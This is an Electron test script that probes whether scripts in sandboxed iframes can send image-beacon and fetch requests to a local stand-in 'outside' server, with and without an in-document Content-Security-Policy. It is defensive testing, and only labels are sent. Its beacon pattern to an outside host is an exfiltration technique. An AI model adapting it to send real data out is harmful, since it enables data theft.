// AZ6 probe — can a script inside a sandboxed artifact frame call out to the network,
// and does an in-document CSP stop it? Two listeners: the "app" server and a second
// "outside" server standing in for any third-party host.
//
// Run: npx electron .pipeline/work/AZ6/probes/electron-exfil-probe.cjs
const { app, BrowserWindow } = require("electron");
const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");

const hits = [];
const outside = http.createServer((req, res) => {
	hits.push(req.url);
	res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
	res.end("ok");
});

const PRELOAD = path.join(__dirname, "electron-frame-probe-preload.cjs");

function frame(label, csp) {
	const meta = csp
		? `<meta http-equiv="Content-Security-Policy" content="${csp}">`
		: "";
	return `<!doctype html><meta charset="utf-8">${meta}<script>
	const out = { name: ${JSON.stringify(label)}, scriptRan: true };
	const beacon = new Image();
	beacon.onerror = () => { out.imgBeacon = "BLOCKED"; };
	beacon.onload = () => { out.imgBeacon = "SENT"; };
	beacon.src = "http://127.0.0.1:__OUT__/img?" + ${JSON.stringify(label)};
	fetch("http://127.0.0.1:__OUT__/fetch?" + ${JSON.stringify(label)})
	  .then(() => { out.crossOriginFetch = "SENT"; })
	  .catch((e) => { out.crossOriginFetch = "BLOCKED: " + e.message; })
	  .finally(() => setTimeout(() => window.parent.postMessage(JSON.stringify(out), "*"), 500));
	<\/script>`;
}

app.whenReady().then(() => {
	outside.listen(0, "127.0.0.1", () => {
		const outPort = outside.address().port;
		const A = frame("5-sandboxed-no-csp", null).replaceAll("__OUT__", outPort);
		const B = frame(
			"6-sandboxed-plus-csp",
			"default-src &apos;none&apos;; script-src &apos;unsafe-inline&apos;; style-src &apos;unsafe-inline&apos;; img-src data:",
		).replaceAll("__OUT__", outPort);
		const HOST = `<!doctype html><html><head><title>HOST</title></head><body>
<script>const results=[];window.addEventListener("message",e=>{results.push(JSON.parse(e.data));window.__RESULTS__=results;});<\/script>
<iframe sandbox="allow-scripts" srcdoc='${A.replaceAll("'", "&apos;")}'></iframe>
<iframe sandbox="allow-scripts" srcdoc='${B.replaceAll("'", "&apos;")}'></iframe>
</body></html>`;

		const appServer = http.createServer((_req, res) => {
			res.writeHead(200, { "content-type": "text/html" });
			res.end(HOST);
		});
		appServer.listen(0, "127.0.0.1", async () => {
			const win = new BrowserWindow({
				show: false,
				webPreferences: { preload: PRELOAD, contextIsolation: true, sandbox: true },
			});
			await win.loadURL(`http://127.0.0.1:${appServer.address().port}/`);
			await new Promise((r) => setTimeout(r, 3000));
			const raw = await win.webContents.executeJavaScript("JSON.stringify(window.__RESULTS__)");
			const parsed = JSON.parse(raw ?? "null") ?? [];
			process.stdout.write(`\nELECTRON ${process.versions.electron} / Chromium ${process.versions.chrome}\n`);
			for (const r of parsed) {
				process.stdout.write(`\n--- ${r.name}\n`);
				for (const [k, v] of Object.entries(r)) if (k !== "name") process.stdout.write(`    ${k}: ${v}\n`);
			}
			process.stdout.write(`\nREQUESTS THAT REACHED THE OUTSIDE SERVER: ${JSON.stringify(hits)}\n`);
			fs.writeFileSync(
				path.join(__dirname, "electron-exfil-probe-result.json"),
				JSON.stringify({ frames: parsed, outsideHits: hits }, null, 2),
			);
			app.exit(0);
		});
	});
});
